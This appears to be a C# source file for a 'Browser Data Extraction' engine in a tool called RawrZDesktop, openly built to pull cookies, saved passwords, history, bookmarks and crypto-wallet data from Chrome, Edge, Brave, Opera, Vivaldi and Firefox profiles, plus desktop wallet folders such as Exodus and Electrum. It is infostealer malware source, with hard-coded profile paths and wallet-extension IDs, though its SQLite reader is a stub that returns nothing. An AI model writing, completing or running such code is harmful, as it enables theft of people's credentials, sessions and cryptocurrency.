using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace RawrZDesktop.Engines
{
    public class BrowserDataExtractionEngine : IEngine
    {
        public string Name => "Browser Data Extraction";
        public string Description => "Extract cookies, passwords, history, and crypto wallets from browsers";
        public string Version => "1.0.0";

        public async Task<EngineResult> ExecuteAsync(Dictionary<string, object> parameters)
        {
            var startTime = DateTime.UtcNow;
            
            try
            {
                var operation = parameters["operation"]?.ToString() ?? throw new ArgumentException("Operation parameter is required");
                
                switch (operation.ToLower())
                {
                    case "extract_chrome":
                        return await ExtractChromeDataAsync();
                    case "extract_firefox":
                        return await ExtractFirefoxDataAsync();
                    case "extract_edge":
                        return await ExtractEdgeDataAsync();
                    case "extract_all_browsers":
                        return await ExtractAllBrowsersAsync();
                    case "extract_crypto_wallets":
                        return await ExtractCryptoWalletsAsync();
                    case "extract_passwords":
                        return await ExtractPasswordsAsync(parameters);
                    case "extract_cookies":
                        return await ExtractCookiesAsync(parameters);
                    case "extract_history":
                        return await ExtractHistoryAsync(parameters);
                    default:
                        return new EngineResult
                        {
                            Success = false,
                            Error = $"Unsupported operation: {operation}"
                        };
                }
            }
            catch (Exception ex)
            {
                return new EngineResult
                {
                    Success = false,
                    Error = ex.Message,
                    ProcessingTimeMs = (long)(DateTime.UtcNow - startTime).TotalMilliseconds
                };
            }
        }

        private async Task<EngineResult> ExtractChromeDataAsync()
        {
            return await Task.Run(() =>
            {
                var chromeData = new Dictionary<string, object>();
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                var chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default");

                try
                {
                    chromeData["cookies"] = ExtractChromeCookies(chromePath);
                    chromeData["passwords"] = ExtractChromePasswords(chromePath);
                    chromeData["history"] = ExtractChromeHistory(chromePath);
                    chromeData["bookmarks"] = ExtractChromeBookmarks(chromePath);
                    chromeData["extensions"] = ExtractChromeExtensions(chromePath);
                    chromeData["crypto_wallets"] = ExtractChromeCryptoWallets(chromePath);
                }
                catch (Exception ex)
                {
                    chromeData["error"] = ex.Message;
                }

                return new EngineResult
                {
                    Success = true,
                    Data = Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(chromeData)),
                    Metadata = new Dictionary<string, object>
                    {
                        ["operation"] = "extract_chrome",
                        ["browser"] = "Chrome",
                        ["data_types"] = chromeData.Keys.Count
                    }
                };
            });
        }

        private async Task<EngineResult> ExtractFirefoxDataAsync()
        {
            return await Task.Run(() =>
            {
                var firefoxData = new Dictionary<string, object>();
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                var firefoxPath = Path.Combine(userProfile, @"AppData\Roaming\Mozilla\Firefox\Profiles");

                try
                {
                    if (Directory.Exists(firefoxPath))
                    {
                        var profiles = Directory.GetDirectories(firefoxPath);
                        foreach (var profile in profiles)
                        {
                            var profileName = Path.GetFileName(profile);
                            firefoxData[profileName] = new Dictionary<string, object>
                            {
                                ["cookies"] = ExtractFirefoxCookies(profile),
                                ["passwords"] = ExtractFirefoxPasswords(profile),
                                ["history"] = ExtractFirefoxHistory(profile),
                                ["bookmarks"] = ExtractFirefoxBookmarks(profile),
                                ["extensions"] = ExtractFirefoxExtensions(profile)
                            };
                        }
                    }
                }
                catch (Exception ex)
                {
                    firefoxData["error"] = ex.Message;
                }

                return new EngineResult
                {
                    Success = true,
                    Data = Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(firefoxData)),
                    Metadata = new Dictionary<string, object>
                    {
                        ["operation"] = "extract_firefox",
                        ["browser"] = "Firefox",
                        ["profiles_found"] = firefoxData.Keys.Count
                    }
                };
            });
        }

        private async Task<EngineResult> ExtractEdgeDataAsync()
        {
            return await Task.Run(() =>
            {
                var edgeData = new Dictionary<string, object>();
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                var edgePath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Default");

                try
                {
                    edgeData["cookies"] = ExtractChromeCookies(edgePath); // Edge uses same format as Chrome
                    edgeData["passwords"] = ExtractChromePasswords(edgePath);
                    edgeData["history"] = ExtractChromeHistory(edgePath);
                    edgeData["bookmarks"] = ExtractChromeBookmarks(edgePath);
                    edgeData["extensions"] = ExtractChromeExtensions(edgePath);
                    edgeData["crypto_wallets"] = ExtractChromeCryptoWallets(edgePath);
                }
                catch (Exception ex)
                {
                    edgeData["error"] = ex.Message;
                }

                return new EngineResult
                {
                    Success = true,
                    Data = Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(edgeData)),
                    Metadata = new Dictionary<string, object>
                    {
                        ["operation"] = "extract_edge",
                        ["browser"] = "Edge",
                        ["data_types"] = edgeData.Keys.Count
                    }
                };
            });
        }

        private async Task<EngineResult> ExtractAllBrowsersAsync()
        {
            return await Task.Run(() =>
            {
                var allBrowsers = new Dictionary<string, object>();
                
                try
                {
                    allBrowsers["chrome"] = ExtractChromeData("");
                    allBrowsers["firefox"] = ExtractFirefoxData("");
                    allBrowsers["edge"] = ExtractEdgeData();
                    allBrowsers["brave"] = ExtractBraveData();
                    allBrowsers["opera"] = ExtractOperaData();
                    allBrowsers["vivaldi"] = ExtractVivaldiData();
                }
                catch (Exception ex)
                {
                    allBrowsers["error"] = ex.Message;
                }

                return new EngineResult
                {
                    Success = true,
                    Data = Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(allBrowsers)),
                    Metadata = new Dictionary<string, object>
                    {
                        ["operation"] = "extract_all_browsers",
                        ["browsers_processed"] = allBrowsers.Keys.Count
                    }
                };
            });
        }

        private async Task<EngineResult> ExtractCryptoWalletsAsync()
        {
            return await Task.Run(() =>
            {
                var wallets = new Dictionary<string, object>();
                
                try
                {
                    wallets["browser_extensions"] = ExtractAllCryptoExtensions();
                    wallets["desktop_wallets"] = ExtractDesktopWallets();
                    wallets["mobile_wallets"] = ExtractMobileWallets();
                }
                catch (Exception ex)
                {
                    wallets["error"] = ex.Message;
                }

                return new EngineResult
                {
                    Success = true,
                    Data = Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(wallets)),
                    Metadata = new Dictionary<string, object>
                    {
                        ["operation"] = "extract_crypto_wallets",
                        ["wallet_types"] = wallets.Keys.Count
                    }
                };
            });
        }

        private async Task<EngineResult> ExtractPasswordsAsync(Dictionary<string, object> parameters)
        {
            return await Task.Run(() =>
            {
                var browser = parameters["browser"]?.ToString() ?? "all";
                var passwords = new Dictionary<string, object>();
                
                try
                {
                    if (browser == "all" || browser == "chrome")
                        passwords["chrome"] = ExtractChromePasswords();
                    
                    if (browser == "all" || browser == "firefox")
                        passwords["firefox"] = ExtractFirefoxPasswords();
                    
                    if (browser == "all" || browser == "edge")
                        passwords["edge"] = ExtractEdgePasswords();
                }
                catch (Exception ex)
                {
                    passwords["error"] = ex.Message;
                }

                return new EngineResult
                {
                    Success = true,
                    Data = Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(passwords)),
                    Metadata = new Dictionary<string, object>
                    {
                        ["operation"] = "extract_passwords",
                        ["browser"] = browser,
                        ["password_sources"] = passwords.Keys.Count
                    }
                };
            });
        }

        private async Task<EngineResult> ExtractCookiesAsync(Dictionary<string, object> parameters)
        {
            return await Task.Run(() =>
            {
                var browser = parameters["browser"]?.ToString() ?? "all";
                var cookies = new Dictionary<string, object>();
                
                try
                {
                    if (browser == "all" || browser == "chrome")
                        cookies["chrome"] = ExtractChromeCookies();
                    
                    if (browser == "all" || browser == "firefox")
                        cookies["firefox"] = ExtractFirefoxCookies();
                    
                    if (browser == "all" || browser == "edge")
                        cookies["edge"] = ExtractEdgeCookies();
                }
                catch (Exception ex)
                {
                    cookies["error"] = ex.Message;
                }

                return new EngineResult
                {
                    Success = true,
                    Data = Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(cookies)),
                    Metadata = new Dictionary<string, object>
                    {
                        ["operation"] = "extract_cookies",
                        ["browser"] = browser,
                        ["cookie_sources"] = cookies.Keys.Count
                    }
                };
            });
        }

        private async Task<EngineResult> ExtractHistoryAsync(Dictionary<string, object> parameters)
        {
            return await Task.Run(() =>
            {
                var browser = parameters["browser"]?.ToString() ?? "all";
                var history = new Dictionary<string, object>();
                
                try
                {
                    if (browser == "all" || browser == "chrome")
                        history["chrome"] = ExtractChromeHistory();
                    
                    if (browser == "all" || browser == "firefox")
                        history["firefox"] = ExtractFirefoxHistory();
                    
                    if (browser == "all" || browser == "edge")
                        history["edge"] = ExtractEdgeHistory();
                }
                catch (Exception ex)
                {
                    history["error"] = ex.Message;
                }

                return new EngineResult
                {
                    Success = true,
                    Data = Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(history)),
                    Metadata = new Dictionary<string, object>
                    {
                        ["operation"] = "extract_history",
                        ["browser"] = browser,
                        ["history_sources"] = history.Keys.Count
                    }
                };
            });
        }

        // Chrome Data Extraction Methods
        private Dictionary<string, object> ExtractChromeCookies(string? chromePath = null)
        {
            var cookies = new Dictionary<string, object>();
            
            if (chromePath == null)
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default");
            }

            try
            {
                var cookiesPath = Path.Combine(chromePath, "Cookies");
                if (File.Exists(cookiesPath))
                {
                    var cookiesData = ReadSqliteDatabase(cookiesPath, "SELECT name, value, host_key, path, expires_utc FROM cookies");
                    cookies["cookies"] = cookiesData;
                    cookies["count"] = cookiesData.Count;
                }
            }
            catch (Exception ex)
            {
                cookies["error"] = ex.Message;
            }

            return cookies;
        }

        private Dictionary<string, object> ExtractChromePasswords(string? chromePath = null)
        {
            var passwords = new Dictionary<string, object>();
            
            if (chromePath == null)
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default");
            }

            try
            {
                var passwordsPath = Path.Combine(chromePath, "Login Data");
                if (File.Exists(passwordsPath))
                {
                    var passwordsData = ReadSqliteDatabase(passwordsPath, "SELECT origin_url, username_value, password_value FROM logins");
                    passwords["passwords"] = passwordsData;
                    passwords["count"] = passwordsData.Count;
                }
            }
            catch (Exception ex)
            {
                passwords["error"] = ex.Message;
            }

            return passwords;
        }

        private Dictionary<string, object> ExtractChromeHistory(string? chromePath = null)
        {
            var history = new Dictionary<string, object>();
            
            if (chromePath == null)
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default");
            }

            try
            {
                var historyPath = Path.Combine(chromePath, "History");
                if (File.Exists(historyPath))
                {
                    var historyData = ReadSqliteDatabase(historyPath, "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000");
                    history["history"] = historyData;
                    history["count"] = historyData.Count;
                }
            }
            catch (Exception ex)
            {
                history["error"] = ex.Message;
            }

            return history;
        }

        private Dictionary<string, object> ExtractChromeBookmarks(string? chromePath = null)
        {
            var bookmarks = new Dictionary<string, object>();
            
            if (chromePath == null)
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default");
            }

            try
            {
                var bookmarksPath = Path.Combine(chromePath, "Bookmarks");
                if (File.Exists(bookmarksPath))
                {
                    var bookmarksJson = File.ReadAllText(bookmarksPath);
                    bookmarks["bookmarks"] = bookmarksJson;
                }
            }
            catch (Exception ex)
            {
                bookmarks["error"] = ex.Message;
            }

            return bookmarks;
        }

        private Dictionary<string, object> ExtractChromeExtensions(string? chromePath = null)
        {
            var extensions = new Dictionary<string, object>();
            
            if (chromePath == null)
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default");
            }

            try
            {
                var extensionsPath = Path.Combine(chromePath, "Extensions");
                if (Directory.Exists(extensionsPath))
                {
                    var extensionDirs = Directory.GetDirectories(extensionsPath);
                    var extensionList = new List<Dictionary<string, object>>();
                    
                    foreach (var extDir in extensionDirs)
                    {
                        var manifestPath = Path.Combine(extDir, "manifest.json");
                        if (File.Exists(manifestPath))
                        {
                            var manifest = File.ReadAllText(manifestPath);
                            extensionList.Add(new Dictionary<string, object>
                            {
                                ["id"] = Path.GetFileName(extDir),
                                ["manifest"] = manifest
                            });
                        }
                    }
                    
                    extensions["extensions"] = extensionList;
                    extensions["count"] = extensionList.Count;
                }
            }
            catch (Exception ex)
            {
                extensions["error"] = ex.Message;
            }

            return extensions;
        }

        private Dictionary<string, object> ExtractChromeCryptoWallets(string? chromePath = null)
        {
            var wallets = new Dictionary<string, object>();
            
            if (chromePath == null)
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default");
            }

            try
            {
                var extensionsPath = Path.Combine(chromePath, "Extensions");
                if (Directory.Exists(extensionsPath))
                {
                    var cryptoExtensions = new List<Dictionary<string, object>>();
                    var knownCryptoExtensions = new[]
                    {
                        "nkbihfbeogaeaoehlefnkodbefgpgknn", // MetaMask
                        "bfnaelmomeimhlpmgjnjophhpkkoljpa", // Phantom
                        "fhilaheimglignddkjgofkcbgekhenbh", // Keplr
                        "fhbohimaelbohpjbbldcngcnapndodjp", // Binance Chain
                        "odbfpeeihdkbihmopkbjmoonfanlbfcl", // Coinbase
                        "ibnejdfjmmkpcnlpebklmnkoeoihofec", // Trust Wallet
                        "afbcbjpbpfadlkmhmclhkeeodmamcflc", // Math Wallet
                        "hnfanknocfeofbddgcijnmhnfnkdnaad", // Coin98
                        "fhbohimaelbohpjbbldcngcnapndodjp", // Binance
                        "nkbihfbeogaeaoehlefnkodbefgpgknn"  // MetaMask
                    };

                    foreach (var extId in knownCryptoExtensions)
                    {
                        var extPath = Path.Combine(extensionsPath, extId);
                        if (Directory.Exists(extPath))
                        {
                            var versions = Directory.GetDirectories(extPath);
                            foreach (var version in versions)
                            {
                                var manifestPath = Path.Combine(version, "manifest.json");
                                if (File.Exists(manifestPath))
                                {
                                    var manifest = File.ReadAllText(manifestPath);
                                    cryptoExtensions.Add(new Dictionary<string, object>
                                    {
                                        ["id"] = extId,
                                        ["version"] = Path.GetFileName(version),
                                        ["manifest"] = manifest
                                    });
                                }
                            }
                        }
                    }
                    
                    wallets["crypto_extensions"] = cryptoExtensions;
                    wallets["count"] = cryptoExtensions.Count;
                }
            }
            catch (Exception ex)
            {
                wallets["error"] = ex.Message;
            }

            return wallets;
        }

        // Firefox Data Extraction Methods
        private Dictionary<string, object> ExtractFirefoxCookies(string? firefoxPath = null)
        {
            var cookies = new Dictionary<string, object>();
            
            if (firefoxPath == null)
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                firefoxPath = Path.Combine(userProfile, @"AppData\Roaming\Mozilla\Firefox\Profiles");
            }

            try
            {
                if (Directory.Exists(firefoxPath))
                {
                    var profiles = Directory.GetDirectories(firefoxPath);
                    var allCookies = new List<Dictionary<string, object>>();
                    
                    foreach (var profile in profiles)
                    {
                        var cookiesPath = Path.Combine(profile, "cookies.sqlite");
                        if (File.Exists(cookiesPath))
                        {
                            var cookiesData = ReadSqliteDatabase(cookiesPath, "SELECT name, value, host, path, expiry FROM moz_cookies");
                            allCookies.AddRange(cookiesData);
                        }
                    }
                    
                    cookies["cookies"] = allCookies;
                    cookies["count"] = allCookies.Count;
                }
            }
            catch (Exception ex)
            {
                cookies["error"] = ex.Message;
            }

            return cookies;
        }

        private Dictionary<string, object> ExtractFirefoxPasswords(string? firefoxPath = null)
        {
            var passwords = new Dictionary<string, object>();
            
            if (firefoxPath == null)
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                firefoxPath = Path.Combine(userProfile, @"AppData\Roaming\Mozilla\Firefox\Profiles");
            }

            try
            {
                if (Directory.Exists(firefoxPath))
                {
                    var profiles = Directory.GetDirectories(firefoxPath);
                    var allPasswords = new List<Dictionary<string, object>>();
                    
                    foreach (var profile in profiles)
                    {
                        var passwordsPath = Path.Combine(profile, "logins.json");
                        if (File.Exists(passwordsPath))
                        {
                            var passwordsJson = File.ReadAllText(passwordsPath);
                            allPasswords.Add(new Dictionary<string, object>
                            {
                                ["profile"] = Path.GetFileName(profile),
                                ["data"] = passwordsJson
                            });
                        }
                    }
                    
                    passwords["passwords"] = allPasswords;
                    passwords["count"] = allPasswords.Count;
                }
            }
            catch (Exception ex)
            {
                passwords["error"] = ex.Message;
            }

            return passwords;
        }

        private Dictionary<string, object> ExtractFirefoxHistory(string? firefoxPath = null)
        {
            var history = new Dictionary<string, object>();
            
            if (firefoxPath == null)
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                firefoxPath = Path.Combine(userProfile, @"AppData\Roaming\Mozilla\Firefox\Profiles");
            }

            try
            {
                if (Directory.Exists(firefoxPath))
                {
                    var profiles = Directory.GetDirectories(firefoxPath);
                    var allHistory = new List<Dictionary<string, object>>();
                    
                    foreach (var profile in profiles)
                    {
                        var historyPath = Path.Combine(profile, "places.sqlite");
                        if (File.Exists(historyPath))
                        {
                            var historyData = ReadSqliteDatabase(historyPath, "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000");
                            allHistory.AddRange(historyData);
                        }
                    }
                    
                    history["history"] = allHistory;
                    history["count"] = allHistory.Count;
                }
            }
            catch (Exception ex)
            {
                history["error"] = ex.Message;
            }

            return history;
        }

        private Dictionary<string, object> ExtractFirefoxBookmarks(string? firefoxPath = null)
        {
            var bookmarks = new Dictionary<string, object>();
            
            if (firefoxPath == null)
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                firefoxPath = Path.Combine(userProfile, @"AppData\Roaming\Mozilla\Firefox\Profiles");
            }

            try
            {
                if (Directory.Exists(firefoxPath))
                {
                    var profiles = Directory.GetDirectories(firefoxPath);
                    var allBookmarks = new List<Dictionary<string, object>>();
                    
                    foreach (var profile in profiles)
                    {
                        var bookmarksPath = Path.Combine(profile, "places.sqlite");
                        if (File.Exists(bookmarksPath))
                        {
                            var bookmarksData = ReadSqliteDatabase(bookmarksPath, "SELECT url, title, dateAdded FROM moz_bookmarks WHERE type = 1");
                            allBookmarks.AddRange(bookmarksData);
                        }
                    }
                    
                    bookmarks["bookmarks"] = allBookmarks;
                    bookmarks["count"] = allBookmarks.Count;
                }
            }
            catch (Exception ex)
            {
                bookmarks["error"] = ex.Message;
            }

            return bookmarks;
        }

        private Dictionary<string, object> ExtractFirefoxExtensions(string? firefoxPath = null)
        {
            var extensions = new Dictionary<string, object>();
            
            if (firefoxPath == null)
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                firefoxPath = Path.Combine(userProfile, @"AppData\Roaming\Mozilla\Firefox\Profiles");
            }

            try
            {
                if (Directory.Exists(firefoxPath))
                {
                    var profiles = Directory.GetDirectories(firefoxPath);
                    var allExtensions = new List<Dictionary<string, object>>();
                    
                    foreach (var profile in profiles)
                    {
                        var extensionsPath = Path.Combine(profile, "extensions");
                        if (Directory.Exists(extensionsPath))
                        {
                            var extensionDirs = Directory.GetDirectories(extensionsPath);
                            foreach (var extDir in extensionDirs)
                            {
                                var manifestPath = Path.Combine(extDir, "manifest.json");
                                if (File.Exists(manifestPath))
                                {
                                    var manifest = File.ReadAllText(manifestPath);
                                    allExtensions.Add(new Dictionary<string, object>
                                    {
                                        ["id"] = Path.GetFileName(extDir),
                                        ["manifest"] = manifest
                                    });
                                }
                            }
                        }
                    }
                    
                    extensions["extensions"] = allExtensions;
                    extensions["count"] = allExtensions.Count;
                }
            }
            catch (Exception ex)
            {
                extensions["error"] = ex.Message;
            }

            return extensions;
        }

        // Edge Data Extraction Methods (same as Chrome)
        private Dictionary<string, object> ExtractEdgeData()
        {
            var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var edgePath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Default");
            return ExtractChromeData(edgePath);
        }

        private Dictionary<string, object> ExtractEdgePasswords()
        {
            var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var edgePath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Default");
            return ExtractChromePasswords(edgePath);
        }

        private Dictionary<string, object> ExtractEdgeCookies()
        {
            var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var edgePath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Default");
            return ExtractChromeCookies(edgePath);
        }

        private Dictionary<string, object> ExtractEdgeHistory()
        {
            var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var edgePath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Default");
            return ExtractChromeHistory(edgePath);
        }

        // Other Browser Data Extraction
        private Dictionary<string, object> ExtractBraveData()
        {
            var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var bravePath = Path.Combine(userProfile, @"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default");
            return ExtractChromeData(bravePath);
        }

        private Dictionary<string, object> ExtractOperaData()
        {
            var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var operaPath = Path.Combine(userProfile, @"AppData\Roaming\Opera Software\Opera Stable");
            return ExtractChromeData(operaPath);
        }

        private Dictionary<string, object> ExtractVivaldiData()
        {
            var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var vivaldiPath = Path.Combine(userProfile, @"AppData\Local\Vivaldi\User Data\Default");
            return ExtractChromeData(vivaldiPath);
        }

        // Crypto Wallet Extraction
        private Dictionary<string, object> ExtractAllCryptoExtensions()
        {
            var allCrypto = new Dictionary<string, object>();
            
            try
            {
                allCrypto["chrome"] = ExtractChromeCryptoWallets();
                allCrypto["edge"] = ExtractChromeCryptoWallets(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"AppData\Local\Microsoft\Edge\User Data\Default"));
                allCrypto["brave"] = ExtractChromeCryptoWallets(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default"));
            }
            catch (Exception ex)
            {
                allCrypto["error"] = ex.Message;
            }

            return allCrypto;
        }

        private Dictionary<string, object> ExtractDesktopWallets()
        {
            var wallets = new Dictionary<string, object>();
            var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            
            try
            {
                var walletPaths = new Dictionary<string, string>
                {
                    ["Exodus"] = Path.Combine(userProfile, @"AppData\Roaming\Exodus"),
                    ["AtomicWallet"] = Path.Combine(userProfile, @"AppData\Roaming\atomic"),
                    ["Electrum"] = Path.Combine(userProfile, @"AppData\Roaming\Electrum"),
                    ["Monero"] = Path.Combine(userProfile, @"AppData\Roaming\Monero"),
                    ["BitcoinCore"] = Path.Combine(userProfile, @"AppData\Roaming\Bitcoin"),
                    ["LitecoinCore"] = Path.Combine(userProfile, @"AppData\Roaming\Litecoin"),
                    ["DashCore"] = Path.Combine(userProfile, @"AppData\Roaming\DashCore"),
                    ["Zcash"] = Path.Combine(userProfile, @"AppData\Roaming\Zcash")
                };

                foreach (var wallet in walletPaths)
                {
                    if (Directory.Exists(wallet.Value))
                    {
                        wallets[wallet.Key] = new Dictionary<string, object>
                        {
                            ["path"] = wallet.Value,
                            ["exists"] = true,
                            ["files"] = Directory.GetFiles(wallet.Value, "*", SearchOption.AllDirectories).Length
                        };
                    }
                }
            }
            catch (Exception ex)
            {
                wallets["error"] = ex.Message;
            }

            return wallets;
        }

        private Dictionary<string, object> ExtractMobileWallets()
        {
            var wallets = new Dictionary<string, object>();
            
            try
            {
                // Check for mobile wallet data in common locations
                var mobilePaths = new Dictionary<string, string>
                {
                    ["Android"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"AppData\Local\Android"),
                    ["iOS"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"AppData\Local\iTunes")
                };

                foreach (var mobile in mobilePaths)
                {
                    if (Directory.Exists(mobile.Value))
                    {
                        wallets[mobile.Key] = new Dictionary<string, object>
                        {
                            ["path"] = mobile.Value,
                            ["exists"] = true
                        };
                    }
                }
            }
            catch (Exception ex)
            {
                wallets["error"] = ex.Message;
            }

            return wallets;
        }

        // Helper Methods
        private Dictionary<string, object> ExtractFirefoxData(string? firefoxPath = null)
        {
            var firefoxData = new Dictionary<string, object>();
            
            if (firefoxPath == null)
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                firefoxPath = Path.Combine(userProfile, @"AppData\Roaming\Mozilla\Firefox\Profiles");
            }

            try
            {
                if (Directory.Exists(firefoxPath))
                {
                    var profiles = Directory.GetDirectories(firefoxPath);
                    var allData = new List<Dictionary<string, object>>();
                    
                    foreach (var profile in profiles)
                    {
                        var profileName = Path.GetFileName(profile);
                        allData.Add(new Dictionary<string, object>
                        {
                            ["profile"] = profileName,
                            ["cookies"] = ExtractFirefoxCookies(profile),
                            ["passwords"] = ExtractFirefoxPasswords(profile),
                            ["history"] = ExtractFirefoxHistory(profile),
                            ["bookmarks"] = ExtractFirefoxBookmarks(profile),
                            ["extensions"] = ExtractFirefoxExtensions(profile)
                        });
                    }
                    
                    firefoxData["profiles"] = allData;
                    firefoxData["count"] = allData.Count;
                }
            }
            catch (Exception ex)
            {
                firefoxData["error"] = ex.Message;
            }

            return firefoxData;
        }

        private Dictionary<string, object> ExtractChromeData(string chromePath)
        {
            return new Dictionary<string, object>
            {
                ["cookies"] = ExtractChromeCookies(chromePath),
                ["passwords"] = ExtractChromePasswords(chromePath),
                ["history"] = ExtractChromeHistory(chromePath),
                ["bookmarks"] = ExtractChromeBookmarks(chromePath),
                ["extensions"] = ExtractChromeExtensions(chromePath),
                ["crypto_wallets"] = ExtractChromeCryptoWallets(chromePath)
            };
        }

        private List<Dictionary<string, object>> ReadSqliteDatabase(string dbPath, string query)
        {
            var results = new List<Dictionary<string, object>>();
            
            try
            {
                // This is a simplified implementation
                // In production, use a proper SQLite library like System.Data.SQLite
                if (File.Exists(dbPath))
                {
                    // For now, return empty results
                    // Real implementation would use SQLite connection
                }
            }
            catch (Exception ex)
            {
                results.Add(new Dictionary<string, object> { ["error"] = ex.Message });
            }

            return results;
        }
    }
}
